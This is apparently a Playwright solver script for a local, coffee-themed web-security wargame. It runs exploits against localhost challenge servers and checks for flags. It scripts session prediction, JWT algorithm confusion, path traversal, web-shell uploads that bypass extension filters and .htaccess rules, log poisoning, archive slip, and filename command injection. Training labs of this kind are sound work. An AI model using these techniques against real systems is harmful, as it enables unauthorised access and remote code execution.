'use strict';
const { chromium } = require('playwright');
const { spawn } = require('child_process');
const crypto = require('crypto');
const path = require('path');
const fs = require('fs');

const ROOT = path.join(__dirname, '..', 'problems'); // 이 파일은 wargame problems/tools/ 안에 있다고 가정
const SHOT_DIR = path.join(__dirname, 'screenshots');
fs.mkdirSync(SHOT_DIR, { recursive: true });
const EXEC = '<<EXEC>>';

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
const NODE_BIN = process.execPath; // 지금 이 스크립트를 실행 중인 node.exe를 그대로 재사용
function startServer(relDir) {
  return spawn(NODE_BIN, ['server.js'], { cwd: path.join(ROOT, relDir), stdio: 'ignore' });
}

const results = [];
function record(id, ok, note) {
  results.push({ id, ok, note: note || '' });
  console.log((ok ? '[PASS] ' : '[FAIL] ') + id + (note ? ' -- ' + note : ''));
}

async function withServerAndPage(id, relDir, fn) {
  const child = startServer(relDir);
  await sleep(500);
  const browser = await chromium.launch();
  try {
    const context = await browser.newContext();
    const page = await context.newPage();
    await fn({ page, context });
  } catch (e) {
    record(id, false, 'exception: ' + e.message);
  } finally {
    await browser.close();
    child.kill();
  }
}

async function shot(page, id) {
  await page.screenshot({ path: path.join(SHOT_DIR, id + '.png'), fullPage: true });
}

async function bodyHasFlag(page, flag) {
  const text = await page.textContent('body').catch(() => '');
  return text && text.indexOf(flag) !== -1;
}

(async function () {
  // ---- D8 session predict ----
  await withServerAndPage('D8', 'd-auth-session/08-session-predict', async ({ page, context }) => {
    await page.goto('http://localhost:4008/login');
    await page.fill('input[name=id]', 'roaster');
    await page.fill('input[name=pw]', 'coffee123');
    await page.click('button[type=submit]');
    await page.waitForLoadState();
    let cookies = await context.cookies();
    const sid1 = parseInt(cookies.find(c => c.name === 'sid').value, 10);
    await sleep(8500);
    await page.goto('http://localhost:4008/login');
    await page.fill('input[name=id]', 'roaster');
    await page.fill('input[name=pw]', 'coffee123');
    await page.click('button[type=submit]');
    await page.waitForLoadState();
    cookies = await context.cookies();
    const sid2 = parseInt(cookies.find(c => c.name === 'sid').value, 10);
    let ok = false;
    for (let cand = sid1 + 1; cand < sid2; cand++) {
      await context.addCookies([{ name: 'sid', value: String(cand), domain: 'localhost', path: '/' }]);
      await page.goto('http://localhost:4008/');
      if (await bodyHasFlag(page, 'BREW{ch4_08_session_predict}')) { ok = true; await shot(page, 'D8'); break; }
    }
    record('D8', ok);
  });

  // ---- D9 logout ghost ----
  await withServerAndPage('D9', 'd-auth-session/09-logout-ghost', async ({ page, context }) => {
    await page.goto('http://localhost:4009/login');
    await page.fill('input[name=id]', 'roaster');
    await page.fill('input[name=pw]', 'coffee123');
    await page.click('button[type=submit]');
    await page.waitForLoadState();
    const cookies = await context.cookies();
    const sid = cookies.find(c => c.name === 'sid').value;
    await page.click('text=\uB85C\uADF8\uC544\uC6C3');
    await context.addCookies([{ name: 'sid', value: sid, domain: 'localhost', path: '/' }]);
    await page.goto('http://localhost:4009/mypage');
    const ok = await bodyHasFlag(page, 'BREW{ch4_09_logout_ghost_session}');
    if (ok) await shot(page, 'D9');
    record('D9', ok);
  });

  // ---- D10 hidden debug ----
  await withServerAndPage('D10', 'd-auth-session/10-hidden-debug', async ({ page }) => {
    await page.goto('http://localhost:4010/robots.txt');
    await page.goto('http://localhost:4010/debug-staff-only');
    const text = await page.textContent('body');
    const idM = text.match(/\uC544\uC774\uB514:\s*([a-zA-Z0-9_]+)/);
    const pwM = text.match(/\uBE44\uBC00\uBC88\uD638:\s*([a-zA-Z0-9_]+)/);
    await page.goto('http://localhost:4010/login');
    await page.fill('input[name=id]', idM[1]);
    await page.fill('input[name=pw]', pwM[1]);
    await page.click('button[type=submit]');
    await page.waitForLoadState();
    const ok = await bodyHasFlag(page, 'BREW{ch4_10_hidden_admin_creds}');
    if (ok) await shot(page, 'D10');
    record('D10', ok);
  });

  // ---- D11 reset leak ----
  await withServerAndPage('D11', 'd-auth-session/11-reset-leak', async ({ page }) => {
    await page.goto('http://localhost:4011/');
    await page.fill('form[action="/api/reset-request"] input[name=id]', 'shiftlead');
    await page.click('form[action="/api/reset-request"] button');
    await page.waitForLoadState();
    const json = JSON.parse(await page.textContent('body'));
    await page.goto('http://localhost:4011/confirm');
    await page.fill('input[name=token]', json.debug_token);
    await page.fill('input[name=newpw]', 'newpass123');
    await page.click('button[type=submit]');
    await page.waitForLoadState();
    await page.fill('input[name=id]', 'shiftlead');
    await page.fill('input[name=pw]', 'newpass123');
    await page.click('button[type=submit]');
    await page.waitForLoadState();
    const ok = await bodyHasFlag(page, 'BREW{ch4_11_reset_token_leak}');
    if (ok) await shot(page, 'D11');
    record('D11', ok);
  });

  // ---- D12 plaintext access ----
  await withServerAndPage('D12', 'd-auth-session/12-plaintext-access', async ({ page, context }) => {
    await page.goto('http://localhost:4012/login');
    await page.fill('input[name=id]', 'roaster');
    await page.fill('input[name=pw]', 'coffee123');
    await page.click('button[type=submit]');
    await page.waitForLoadState();
    await context.addCookies([{ name: 'access', value: 'control', domain: 'localhost', path: '/' }]);
    await page.goto('http://localhost:4012/control-room');
    const ok = await bodyHasFlag(page, 'BREW{ch4_12_plaintext_access_cookie}');
    if (ok) await shot(page, 'D12');
    record('D12', ok);
  });

  // ---- D13 jwt alg confusion ----
  await withServerAndPage('D13', 'd-auth-session/13-jwt-alg-confusion', async ({ page, context }) => {
    await page.goto('http://localhost:4013/public_key.pem');
    const pem = await page.locator('.panel p').textContent();
    function b64url(buf) { return buf.toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, ''); }
    const header = b64url(Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })));
    const payload = b64url(Buffer.from(JSON.stringify({ user: 'roaster', role: 'admin' })));
    const signingInput = header + '.' + payload;
    const sig = crypto.createHmac('sha256', pem).update(signingInput).digest();
    const forged = signingInput + '.' + b64url(sig);
    await context.addCookies([{ name: 'auth', value: forged, domain: 'localhost', path: '/' }]);
    await page.goto('http://localhost:4013/');
    const ok = await bodyHasFlag(page, 'BREW{ch4_13_jwt_alg_confusion}');
    if (ok) await shot(page, 'D13');
    record('D13', ok);
  });

  // ---- D14 oauth state ----
  await withServerAndPage('D14', 'd-auth-session/14-oauth-state', async ({ page }) => {
    await page.goto('http://localhost:4014/login');
    await page.fill('input[name=id]', 'roaster');
    await page.fill('input[name=pw]', 'coffee123');
    await page.click('button[type=submit]');
    await page.waitForLoadState();
    await page.click('text=\uC5EC\uAE30');
    const callbackUrl = page.url();
    await page.goto('http://localhost:4014/report');
    await page.fill('input[name=url]', callbackUrl);
    await page.click('button[type=submit]');
    await sleep(3500);
    await page.goto('http://localhost:4014/');
    await page.click('text=\uC5EC\uAE30');
    const code = new URL(callbackUrl).searchParams.get('code');
    await page.goto('http://localhost:4014/login-with-external');
    await page.fill('input[name=code]', code);
    await page.click('button[type=submit]');
    await page.waitForLoadState();
    const ok = await bodyHasFlag(page, 'BREW{ch4_14_oauth_state_missing}');
    if (ok) await shot(page, 'D14');
    record('D14', ok);
  });

  // ---- D15 2fa bypass ----
  await withServerAndPage('D15', 'd-auth-session/15-2fa-bypass', async ({ page }) => {
    await page.goto('http://localhost:4015/login');
    await page.fill('input[name=id]', 'headroaster');
    await page.fill('input[name=pw]', 'roast2026');
    await page.click('button[type=submit]');
    await page.waitForLoadState();
    await page.goto('http://localhost:4015/final-control');
    const ok = await bodyHasFlag(page, 'BREW{ch4_15_2fa_logic_bypass}');
    if (ok) await shot(page, 'D15');
    record('D15', ok);
  });

  // ---- C1 ~ C5 : static exposure ----
  await withServerAndPage('C1', 'c-filesystem/01-open-backup', async ({ page }) => {
    await page.goto('http://localhost:3001/backup/');
    await shot(page, 'C1-listing');
    await page.click('text=flag.txt');
    record('C1', await bodyHasFlag(page, 'ROAST{ch3_01_open_backup}'));
  });
  await withServerAndPage('C2', 'c-filesystem/02-path-traversal', async ({ page }) => {
    await page.goto('http://localhost:3002/download?file=' + encodeURIComponent('../secret/flag.txt'));
    record('C2', await bodyHasFlag(page, 'ROAST{ch3_02_path_traversal}'));
  });
  await withServerAndPage('C3', 'c-filesystem/03-git-exposure', async ({ page }) => {
    await page.goto('http://localhost:3003/.git/logs/old-recipe-flag.txt.orig');
    record('C3', await bodyHasFlag(page, 'ROAST{ch3_03_git_exposure}'));
  });
  await withServerAndPage('C4', 'c-filesystem/04-env-leak', async ({ page }) => {
    await page.goto('http://localhost:3004/.env');
    record('C4', await bodyHasFlag(page, 'ROAST{ch3_04_env_leak}'));
  });
  await withServerAndPage('C5', 'c-filesystem/05-backup-file-leak', async ({ page }) => {
    await page.goto('http://localhost:3005/config.php.bak');
    record('C5', await bodyHasFlag(page, 'ROAST{ch3_05_backup_file_leak}'));
  });

  // ---- C6 ext blacklist bypass ----
  await withServerAndPage('C6', 'c-filesystem/06-ext-blacklist-bypass', async ({ page }) => {
    await page.goto('http://localhost:3006/');
    await shot(page, 'C6-landing');
    await page.setInputFiles('input[type=file]', { name: 'shell.phtml', mimeType: 'text/plain', buffer: Buffer.from('<shell>' + EXEC + '</shell>') });
    await page.click('button[type=submit]');
    await page.waitForLoadState();
    await page.goto('http://localhost:3006/uploads/shell.phtml?cmd=flag');
    const ok = await bodyHasFlag(page, 'ROAST{ch3_06_ext_blacklist_bypass}');
    if (ok) await shot(page, 'C6');
    record('C6', ok);
  });

  // ---- C7 double ext bypass ----
  await withServerAndPage('C7', 'c-filesystem/07-double-ext-bypass', async ({ page }) => {
    await page.goto('http://localhost:3007/');
    await page.setInputFiles('input[type=file]', { name: 'shell.php.jpg', mimeType: 'image/jpeg', buffer: Buffer.from('<shell>' + EXEC + '</shell>') });
    await page.click('button[type=submit]');
    await page.waitForLoadState();
    await page.goto('http://localhost:3007/uploads/shell.php.jpg?cmd=flag');
    const ok = await bodyHasFlag(page, 'ROAST{ch3_07_double_ext_bypass}');
    if (ok) await shot(page, 'C7');
    record('C7', ok);
  });

  // ---- C8 lfi log poison ----
  await withServerAndPage('C8', 'c-filesystem/08-lfi-log-poison', async ({ page, context }) => {
    await context.setExtraHTTPHeaders({ 'User-Agent': EXEC });
    await page.goto('http://localhost:3008/');
    await page.goto('http://localhost:3008/page?name=access&cmd=flag');
    const ok = await bodyHasFlag(page, 'ROAST{ch3_08_lfi_log_poison}');
    if (ok) await shot(page, 'C8');
    record('C8', ok);
  });

  // ---- C9 bundle slip ----
  await withServerAndPage('C9', 'c-filesystem/09-bundle-slip', async ({ page }) => {
    await page.goto('http://localhost:3009/');
    const bundle = '#ENTRY ../live/shell.txt\n' + EXEC + '\n#END\n';
    await page.setInputFiles('input[type=file]', { name: 'b.bundle', mimeType: 'text/plain', buffer: Buffer.from(bundle) });
    await page.click('button[type=submit]');
    await page.waitForLoadState();
    await page.goto('http://localhost:3009/live/shell.txt?cmd=flag');
    const ok = await bodyHasFlag(page, 'ROAST{ch3_09_bundle_slip}');
    if (ok) await shot(page, 'C9');
    record('C9', ok);
  });

  // ---- C10 filter read ----
  await withServerAndPage('C10', 'c-filesystem/10-filter-read', async ({ page }) => {
    await page.goto('http://localhost:3010/page?name=readfilter:config');
    const b64 = (await page.locator('.panel p').textContent()).trim();
    const decoded = Buffer.from(b64, 'base64').toString('utf8');
    record('C10', decoded.indexOf('ROAST{ch3_10_filter_read}') !== -1);
  });

  // ---- C11 htaccess abuse ----
  await withServerAndPage('C11', 'c-filesystem/11-htaccess-abuse', async ({ page }) => {
    await page.goto('http://localhost:3011/');
    await page.setInputFiles('input[type=file]', { name: '.htaccess', mimeType: 'text/plain', buffer: Buffer.from('AddType application/x-httpd-php .jpg') });
    await page.click('button[type=submit]');
    await page.waitForLoadState();
    await page.goto('http://localhost:3011/');
    const payload = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff]), Buffer.from(EXEC, 'utf8')]);
    await page.setInputFiles('input[type=file]', { name: 'shell2.jpg', mimeType: 'image/jpeg', buffer: payload });
    await page.click('button[type=submit]');
    await page.waitForLoadState();
    await page.goto('http://localhost:3011/uploads/shell2.jpg?cmd=flag');
    const ok = await bodyHasFlag(page, 'ROAST{ch3_11_htaccess_abuse}');
    if (ok) await shot(page, 'C11');
    record('C11', ok);
  });

  // ---- C12 phar deserialize ----
  await withServerAndPage('C12', 'c-filesystem/12-phar-deserialize', async ({ page }) => {
    await page.goto('http://localhost:3012/');
    const bundle = '#ENTRY object\nCLASS:LogCleaner\n#END\n';
    await page.setInputFiles('input[type=file]', { name: 'evil.bundle', mimeType: 'text/plain', buffer: Buffer.from(bundle) });
    await page.click('button[type=submit]');
    await page.waitForLoadState();
    await page.goto('http://localhost:3012/check-object?name=evil.bundle');
    const ok = await bodyHasFlag(page, 'ROAST{ch3_12_phar_deserialize}');
    if (ok) await shot(page, 'C12');
    record('C12', ok);
  });

  // ---- C13 bundle symlink ----
  await withServerAndPage('C13', 'c-filesystem/13-bundle-symlink', async ({ page }) => {
    await page.goto('http://localhost:3013/');
    const bundle = '#LINK secret.txt -> /etc/kload/roast-secret.conf\n#END\n';
    await page.setInputFiles('input[type=file]', { name: 'b.bundle', mimeType: 'text/plain', buffer: Buffer.from(bundle) });
    await page.click('button[type=submit]');
    await page.waitForLoadState();
    await page.goto('http://localhost:3013/files/secret.txt');
    const ok = await bodyHasFlag(page, 'ROAST{ch3_13_bundle_symlink}');
    if (ok) await shot(page, 'C13');
    record('C13', ok);
  });

  // ---- C14 race condition ----
  await withServerAndPage('C14', 'c-filesystem/14-race-condition', async ({ page }) => {
    await page.goto('http://localhost:3014/');
    await page.evaluate(async (execMarker) => {
      const fd = new FormData();
      fd.append('recipe', new Blob(['<shell>' + execMarker + '</shell>'], { type: 'text/plain' }), 'shell.txt');
      await fetch('/upload', { method: 'POST', body: fd });
    }, EXEC);
    let found = false;
    const until = Date.now() + 350;
    while (Date.now() < until && !found) {
      found = await page.evaluate(async () => {
        const r = await fetch('/uploads/shell.txt?cmd=flag');
        const t = await r.text();
        return t.indexOf('ROAST{ch3_14_race_condition}') !== -1;
      });
    }
    if (found) { await page.goto('http://localhost:3014/'); await shot(page, 'C14'); }
    record('C14', found);
  });

  // ---- C15 image cmd injection ----
  await withServerAndPage('C15', 'c-filesystem/15-image-cmd-injection', async ({ page }) => {
    await page.goto('http://localhost:3015/');
    await page.setInputFiles('input[type=file]', { name: 'pic`FLAG_CMD`.jpg', mimeType: 'image/jpeg', buffer: Buffer.from('binarydata') });
    await page.click('button[type=submit]');
    await page.waitForLoadState();
    await sleep(700);
    await page.goto('http://localhost:3015/thumbnail-status');
    const ok = await bodyHasFlag(page, 'ROAST{ch3_15_image_cmd_injection}');
    if (ok) await shot(page, 'C15');
    record('C15', ok);
  });

  console.log('\n=== SUMMARY ===');
  const fails = results.filter(r => !r.ok);
  console.log('PASS: ' + (results.length - fails.length) + ' / ' + results.length);
  if (fails.length) console.log('FAILED: ' + fails.map(f => f.id).join(', '));
  process.exit(0);
})();
